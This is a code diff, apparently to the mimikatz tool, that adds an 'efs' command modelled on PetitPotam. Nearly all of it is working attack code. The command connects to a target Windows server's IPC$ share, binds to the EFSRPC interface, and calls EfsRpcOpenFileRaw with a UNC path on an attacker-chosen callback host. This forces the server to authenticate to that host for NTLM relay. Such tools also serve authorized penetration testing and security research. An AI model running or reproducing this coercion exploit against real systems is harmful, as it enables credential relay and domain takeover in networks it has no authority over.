@@ -28,6 +28,7 @@ const KUHL_M_C kuhl_m_c_misc[] = {
 	{kuhl_m_misc_aadcookie,	L"aadcookie",	NULL},
 	{kuhl_m_misc_aadcookie_NgcSignWithSymmetricPopKey,	L"ngcsign",	NULL},
 	{kuhl_m_misc_spooler,	L"spooler",		NULL},
+	{kuhl_m_misc_efs,		L"efs",			NULL},
 	{kuhl_m_misc_printnightmare,	L"printnightmare",		NULL},
 	{kuhl_m_misc_sccm_accounts,	L"sccm",		NULL},
 	{kuhl_m_misc_shadowcopies, L"shadowcopies",	NULL},
@@ -1393,6 +1394,127 @@ NTSTATUS kuhl_m_misc_spooler(int argc, wchar_t * argv[])
 				}
 
 				LocalFree(szPathToCallback);
+			}
+		}
+		else PRINT_ERROR(L"missing /connect argument to specify notifications target");
+	}
+	else PRINT_ERROR(L"missing /server argument to specify spooler server");
+
+	return STATUS_SUCCESS;
+}
+
+// Inspired from PetitPotam (https://github.com/topotam/PetitPotam) by topotam (@topotam77)
+NTSTATUS kuhl_m_misc_efs(int argc, wchar_t * argv[])
+{
+	NTSTATUS status;
+	RPC_BINDING_HANDLE hEfsHandle;
+	PEXIMPORT_CONTEXT_HANDLE hImportCtx;
+	DWORD dwRet, AuthnSvc;
+	long ret = 0;
+	NETRESOURCE nr = {0, RESOURCETYPE_DISK,	0, 0, NULL, NULL, NULL, NULL};
+	LPCWSTR szUser, szPassword, szRemote = NULL, szEndpoint, szCallbackTo;
+	PWSTR szCallbackToShare;
+
+	SEC_WINNT_AUTH_IDENTITY secIdentity = {NULL, 0, NULL, 0, NULL, 0, SEC_WINNT_AUTH_IDENTITY_UNICODE};
+
+	if(kull_m_string_args_byName(argc, argv, L"authuser", &szUser, NULL))
+	{
+		AuthnSvc = RPC_C_AUTHN_GSS_NEGOTIATE;
+		kprintf(L"[auth ] Explicit authentication\n");
+		kprintf(L"[auth ] Username: %s\n", szUser);
+		secIdentity.User = (USHORT *) szUser;
+		secIdentity.UserLength = lstrlen(szUser);
+
+		if(kull_m_string_args_byName(argc, argv, L"authpassword", &szPassword, NULL))
+		{
+			kprintf(L"[auth ] Password: %s\n", szPassword);
+			secIdentity.Password = (USHORT *) szPassword;
+			secIdentity.PasswordLength = lstrlen(szPassword);
+		}
+	}
+	else if(kull_m_string_args_byName(argc, argv, L"noauth", NULL, NULL))
+	{
+		AuthnSvc = RPC_C_AUTHN_NONE;
+		kprintf(L"[auth ] None\n");
+		szUser = szPassword = L"";
+	}
+	else
+	{
+		AuthnSvc = RPC_C_AUTHN_DEFAULT;
+		kprintf(L"[auth ] Default (current)\n");
+		szUser = szPassword = NULL;
+	}
+
+	kull_m_string_args_byName(argc, argv, L"endpoint", &szEndpoint, L"\\pipe\\lsarpc");
+	kprintf(L"[ rpc ] Endpoint: %s\n", szEndpoint);
+
+	if(kull_m_string_args_byName(argc, argv, L"server", &szRemote, NULL) || kull_m_string_args_byName(argc, argv, L"target", &szRemote, NULL))
+	{
+		if(kull_m_string_args_byName(argc, argv, L"connect", &szCallbackTo, NULL) || kull_m_string_args_byName(argc, argv, L"callback", &szCallbackTo, NULL))
+		{
+			if(kull_m_string_sprintf(&nr.lpRemoteName, L"\\\\%s\\IPC$", szRemote))
+			{
+				if(kull_m_string_sprintf(&szCallbackToShare, L"\\\\%s\\" MIMIKATZ L"\\" MIMIKATZ, szCallbackTo))
+				{
+					kprintf(L"[trans] Disconnect eventual IPC: ");
+					dwRet = WNetCancelConnection2(nr.lpRemoteName, 0, TRUE);
+					if((dwRet == NO_ERROR) || (dwRet == ERROR_NOT_CONNECTED))
+					{
+						kprintf(L"OK\n[trans] Connect to IPC: ");
+						dwRet = WNetAddConnection2(&nr, szPassword, szUser, CONNECT_TEMPORARY);
+						if(dwRet == NO_ERROR)
+						{
+							kprintf(L"OK\n");
+							if(kull_m_rpc_createBinding(NULL, L"ncacn_np", szRemote, szEndpoint, L"host", TRUE, AuthnSvc, secIdentity.UserLength ? &secIdentity : NULL, RPC_C_IMP_LEVEL_DEFAULT, &hEfsHandle, NULL))
+							{
+								kprintf(L"[ rpc ] Resolve Endpoint: ");
+								status = RpcEpResolveBinding(hEfsHandle, &efsrpc_v1_0_c_ifspec);
+								if(status == RPC_S_OK)
+								{
+									kprintf(L"OK\n\n");
+									RpcTryExcept
+									{
+										ret = EfsRpcOpenFileRaw(hEfsHandle, &hImportCtx, szCallbackToShare, 0);
+										if(ret == ERROR_BAD_NETPATH)
+										{
+											kprintf(L"Remote server reported bad network path! (OK)\n> Server (%s) may have tried to authenticate (to: %s)\n", szRemote, szCallbackTo);
+										}
+										else if(ret == 0)
+										{
+											PRINT_ERROR(L"EfsRpcOpenFileRaw is a success, really? (not normal)\n");
+											EfsRpcCloseRaw(&hEfsHandle);
+										}
+										else
+										{
+											PRINT_ERROR(L"EfsRpcOpenFileRaw: ", ret);
+										}
+									}
+									RpcExcept(RPC_EXCEPTION)
+										PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
+									RpcEndExcept
+
+									kprintf(L"\n");
+								}
+								else PRINT_ERROR(L"RpcEpResolveBinding: 0x%08x\n", status);
+								
+								kull_m_rpc_deleteBinding(&hEfsHandle);
+							}
+
+							kprintf(L"[trans] Disconnect IPC: ");
+							dwRet = WNetCancelConnection2(nr.lpRemoteName, 0, TRUE);
+							if(dwRet == NO_ERROR)
+							{
+								kprintf(L"OK\n");
+							}
+							else PRINT_ERROR(L"WNetCancelConnection2: 0x%08x\n");
+						}
+						else PRINT_ERROR(L"WNetAddConnection2:%u\n", dwRet);
+					}
+					else PRINT_ERROR(L"WNetCancelConnection2: %u\n", dwRet);
+
+					LocalFree(szCallbackToShare);
+				}
+				LocalFree(nr.lpRemoteName);
 			}
 		}
 		else PRINT_ERROR(L"missing /connect argument to specify notifications target");
